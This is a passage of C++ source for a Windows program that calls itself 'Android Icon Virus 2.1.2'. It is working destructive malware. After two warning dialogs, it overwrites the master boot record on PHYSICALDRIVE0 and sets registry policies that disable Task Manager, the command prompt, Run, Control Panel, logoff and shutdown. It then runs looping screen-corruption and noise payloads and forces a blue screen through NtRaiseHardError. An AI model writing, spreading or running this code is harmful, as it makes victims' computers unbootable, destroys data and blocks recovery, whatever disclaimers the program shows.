    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 9 | t >> 9) & 50 & t >> 9 ^ (t & t >> 9 | t >> 9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI Fault(LPVOID lpParam) {
    HDC DC = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1)
    {
        BitBlt(DC, -1, -1, w, h, DC, 0, 0, SRCINVERT);
        Sleep(100);
    }
    return 0;
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 6 | (t >> 2) * (t >> 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI Text1(LPVOID lpParam) {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"Android Icon Virus";
    for (;;)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
    }
    return 0;
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(6 * t & t >> 6 | 3 * t & 4 * t >> 10);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI Fault2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    for (;;)
    {
        int v5 = w - 5;
        int v6 = w - 20;
        StretchBlt(hdc, -5, -5, v6, v5, hdc, 0, 0, w, h, NOTSRCERASE);
        StretchBlt(hdc, 5, 5, v6, v5, hdc, 0, 0, w, h, NOTSRCERASE);
        StretchBlt(hdc, -5, -5, v6, w - 5, hdc, 0, 0, h, w, SRCINVERT);
        StretchBlt(hdc, 5, 5, v6, w - 5, hdc, 0, 0, h, w, SRCINVERT);
        Sleep(rand() % 500);
        Sleep(100);
    }
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 6 | t >> 12) & 15 & t >> 9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI abcdefg(LPVOID lpParam) {
    for (;;) {
        int width, height;
        HWND hwnd;
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
        hwnd = GetDesktopWindow();    HDC hdc = GetDC(NULL);
        RECT rekt;
        GetWindowRect(hwnd, &rekt);
        HBRUSH rainbow = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, rainbow);
        int xyrng = rand() % width, h = height - rand() % width - (width / 2 - 110);
        POINT pt3[3];
        int inc3 = 60;
        inc3++;
        pt3[0].x = rekt.left + inc3;
        pt3[0].y = rekt.top - inc3;
        pt3[1].x = rekt.right + inc3;
        pt3[1].y = rekt.top + inc3;
        pt3[2].x = rekt.left - inc3;
        pt3[2].y = rekt.bottom - inc3;
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);
        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);
        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);
        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);
        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
        Sleep(100);
    }
    return 0;
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t ^ t + (t >> 8 | 1) / (t - 12800 ^ t) >> 10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI StrangeTunnel(LPVOID lpParam) {
    HDC hdcDest = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (1)
    {
        StretchBlt(hdcDest, -10, -10, w - 20, h - 20, hdcDest, 0, 0, w, h, 0x440328u);
        StretchBlt(hdcDest, 10, 10, w - 20, h - 20, hdcDest, 0, 0, w, h, 0x660046u);
        Sleep(100);
    }
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ t >> 12) * t >> 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI payload1(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        desk = GetDC(0);
        StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255))); //epic gdi leak
        PatBlt(desk, 0, 0, sw, sh, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc);
        DeleteObject(hdc);

        Sleep(200);

    }
    return 0;
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 11 * t) ^ t >> 45 + 14);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI invmelter(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    for (;;)
    {
        desk = GetDC(0);
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        PatBlt(desk, 0, 0, x, y, PATINVERT);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        hdc = GetDC(0);
        x = rand() % w;
        BitBlt(hdc, x, 1, 10, h, hdc, x, 0, SRCCOPY);
        Sleep(100);
    }
    return 0;
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t + 19) ^ t >> 19 * (t - 8) + t >> 10);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
DWORD WINAPI winmain(LPVOID lpParam) {
    for (int t = 0; ; t++) {
        int n = t % 2 == 0 ? 1 : -1;
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        POINT pos[3];
        pos[0].x = n * 30, pos[0].y = -(n * 30);
        pos[1].x = w + n * 30, pos[1].y = n * 30;
        pos[2].x = -(n * 30), pos[2].y = h - n * 30;
        PlgBlt(hcdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, (t % 20 < 10 ? SRCPAINT : SRCAND));
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteDC(hcdc);
        DeleteObject(hBitmap);
        Sleep(100);
    }
    return 0;
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (3 + (1 & t >> 7)) >> (3 & t >> 7) | t >> 2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI rgg(LPVOID lpParam) {
    {
        for (;;) {
            HDC hdc = GetDC(0);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            POINT pos[3];
            pos[0].x = 10, pos[0].y = -30;
            pos[1].x = w + 10, pos[1].y = 30;
            pos[2].x = -40, pos[2].y = h - 30;
            PlgBlt(hdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
            ReleaseDC(NULL, hdc);
            DeleteObject(hdc);
            Sleep(200);
        }
        return 0;
    }
    Sleep(30000);
}

DWORD WINAPI drawandroidicon(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HWND hwnd = GetDesktopWindow();
    HINSTANCE ANDROIDICON = LoadLibrary(_T("ANDROIDICON.dll"));
    HDC hdc = GetWindowDC(hwnd);
    srand(time(0));
    Sleep(1000);
    while (1) {
        for (int x = 0; x <= w; x += 32) {
            for (int y = 0; y <= h; y += 32) {
                DrawIcon(hdc, x, y, LoadIcon(ANDROIDICON, MAKEINTRESOURCE(rand() % 256)));
            }
        }
        Sleep(1000);
    }
    while (1);
}

DWORD WINAPI drawandroidicon2k(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HWND hwnd = GetDesktopWindow();
    HINSTANCE ANDROIDICON = LoadLibrary(_T("ANDROIDICON2K.dll"));
    HDC hdc = GetWindowDC(hwnd);
    srand(time(0));
    Sleep(1000);
    while (1) {
        for (int x = 0; x <= w; x += 32) {
            for (int y = 0; y <= h; y += 32) {
                DrawIcon(hdc, x, y, LoadIcon(ANDROIDICON, MAKEINTRESOURCE(rand() % 256)));
            }
        }
        Sleep(1000);
    }
    while (1);
}

DWORD WINAPI drawxugeicon(LPVOID lpParam) {
    HWND hwnd = GetDesktopWindow();
    HINSTANCE XUGEICON = LoadLibrary(_T("XUGEICON.dll"));
    HDC hdc = GetWindowDC(hwnd);
    POINT point;
    while (1)
    {
        GetCursorPos(&point);
        DrawIcon(hdc, point.x + 0, point.y + 0, LoadIcon(XUGEICON, MAKEINTRESOURCE(rand() % 256)));

    }Sleep(1);
}

DWORD WINAPI drawxugeicon2k(LPVOID lpParam) {
    HWND hwnd = GetDesktopWindow();
    HINSTANCE XUGEICON = LoadLibrary(_T("XUGEICON2K.dll"));
    HDC hdc = GetWindowDC(hwnd);
    POINT point;
    while (1)
    {
        GetCursorPos(&point);
        DrawIcon(hdc, point.x + 0, point.y + 0, LoadIcon(XUGEICON, MAKEINTRESOURCE(rand() % 256)));

    }Sleep(1);
}

int killmbr()
{
    BYTE pmbr[4096] = { 0 };
    DWORD write;
    HANDLE mbr;
    char mbrdata[mbrsize] = boot;
    memcpy(pmbr, mbrdata, sizeof(mbrdata) - 1);
    pmbr[510] = 0x55;
    pmbr[511] = 0xAA;
    mbr = CreateFile
    (
        L"\\\\.\\PHYSICALDRIVE0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (WriteFile(mbr, pmbr, sizeof(pmbr), &write, NULL) == TRUE)
    {
    }
    else
    {
    }
    CloseHandle(mbr);
    return EXIT_SUCCESS;
}

void disabletaskmgr()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
    RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void nologoff()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoLogOff", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void nopower()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoClose", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void disablecmd()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System", &hkey);
    RegSetValueEx(hkey, L"DisableCMD", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void disablegpeditmscandregedit()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"RestrictRun", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void norun()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoRun", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void nocontrolpanel()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoControlPanel", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void bsod() {
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
    ExitProcess(0);
}

int main() {
    OSVERSIONINFOEXW osvi = { 0 };
    DWORDLONG dwlConditionMask = 0;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    osvi.dwMajorVersion = 5;
    osvi.dwMinorVersion = 0;
    VER_SET_CONDITION(dwlConditionMask, VER_MAJORVERSION, VER_EQUAL);
    VER_SET_CONDITION(dwlConditionMask, VER_MINORVERSION, VER_EQUAL);
    if (VerifyVersionInfo(&osvi, VER_MAJORVERSION | VER_MINORVERSION, dwlConditionMask))
    {
        CREATE_NO_WINDOW;
        if (MessageBoxW(NULL, L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program. And then click the 'Yes' button to continue.", L"Android Icon Virus 2.1.2 (Internal testing version)", MB_YESNO | MB_ICONWARNING) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Android Icon Virus 2.1.2 (Internal testing version)", MB_YESNO | MB_ICONWARNING) == IDNO)
            {
                ExitProcess(0);
            }
            else
            {
                icon2kdll(1);
                killmbr();
                disabletaskmgr();
                nologoff();
                nopower();
                disablecmd();
                disablegpeditmscandregedit();
                norun();
                nocontrolpanel();
                sound10();
                HANDLE thread15 = CreateThread(0, 0, drawandroidicon2k, 0, 0, 0);
                HANDLE thread16 = CreateThread(0, 0, drawxugeicon2k, 0, 0, 0);
                HANDLE thread1 = CreateThread(0, 0, Color, 0, 0, 0);
                HANDLE thread2 = CreateThread(0, 0, ColorInvert, 0, 0, 0);
                HANDLE thread3 = CreateThread(0, 0, Tunnel, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread1, 0);
                TerminateThread(thread2, 0);
                TerminateThread(thread3, 0);
                sound1();
                HANDLE thread4 = CreateThread(0, 0, Fault, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread4, 0);
                sound2();
                HANDLE thread5 = CreateThread(0, 0, Text1, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread5, 0);
                sound3();
                HANDLE thread6 = CreateThread(0, 0, Fault2, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread6, 0);
                sound4();
                HANDLE thread7 = CreateThread(0, 0, abcdefg, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread7, 0);
                sound5();
                HANDLE thread8 = CreateThread(0, 0, StrangeTunnel, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread8, 0);
                sound6();
                HANDLE thread9 = CreateThread(0, 0, payload1, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread9, 0);
                sound7();
                HANDLE thread10 = CreateThread(0, 0, invmelter, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread10, 0);
                sound8();
                HANDLE thread11 = CreateThread(0, 0, winmain, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread11, 0);
                sound9();
                HANDLE thread12 = CreateThread(0, 0, rgg, 0, 0, 0);
                HANDLE thread13 = CreateThread(0, 0, Color, 0, 0, 0);
                HANDLE thread14 = CreateThread(0, 0, ColorInvert, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread12, 0);
                TerminateThread(thread13, 0);
                TerminateThread(thread14, 0);
                TerminateThread(thread15, 0);
                TerminateThread(thread16, 0);
                bsod();
                return 0;
            }


        }
    }
    else {
        CREATE_NO_WINDOW;
        if (MessageBoxW(NULL, L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program. And then click the 'Yes' button to continue.", L"Android Icon Virus 2.1.2 (Internal testing version)", MB_YESNO | MB_ICONWARNING) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Android Icon Virus 2.1.2 (Internal testing version)", MB_YESNO | MB_ICONWARNING) == IDNO)
            {
                ExitProcess(0);
            }
            else
            {
                icondll(1);
                killmbr();
                disabletaskmgr();
                nologoff();
                nopower();
                disablecmd();
                disablegpeditmscandregedit();
                norun();
                nocontrolpanel();
                sound10();
                HANDLE thread17 = CreateThread(0, 0, drawandroidicon, 0, 0, 0);
                HANDLE thread18 = CreateThread(0, 0, drawxugeicon, 0, 0, 0);
                HANDLE thread19 = CreateThread(0, 0, Color, 0, 0, 0);
                HANDLE thread20 = CreateThread(0, 0, ColorInvert, 0, 0, 0);
                HANDLE thread21 = CreateThread(0, 0, Tunnel, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread19, 0);
                TerminateThread(thread20, 0);
                TerminateThread(thread21, 0);
                sound1();
                HANDLE thread22 = CreateThread(0, 0, Fault, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread22, 0);
                sound2();
                HANDLE thread23 = CreateThread(0, 0, Text1, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread23, 0);
                sound3();
                HANDLE thread24 = CreateThread(0, 0, Fault2, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread24, 0);
                sound4();
                HANDLE thread25 = CreateThread(0, 0, abcdefg, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread25, 0);
                sound5();
                HANDLE thread26 = CreateThread(0, 0, StrangeTunnel, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread26, 0);
                sound6();
                HANDLE thread27 = CreateThread(0, 0, payload1, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread27, 0);
                sound7();
                HANDLE thread28 = CreateThread(0, 0, invmelter, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread28, 0);
                sound8();
                HANDLE thread29 = CreateThread(0, 0, winmain, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread29, 0);
                sound9();
                HANDLE thread30 = CreateThread(0, 0, rgg, 0, 0, 0);
                HANDLE thread31 = CreateThread(0, 0, Color, 0, 0, 0);
                HANDLE thread32 = CreateThread(0, 0, ColorInvert, 0, 0, 0);
                Sleep(30000);
                TerminateThread(thread30, 0);
                TerminateThread(thread31, 0);
                TerminateThread(thread32, 0);
                TerminateThread(thread17, 0);
                TerminateThread(thread18, 0);
                bsod();
                return 0;
            }


        }
    }
}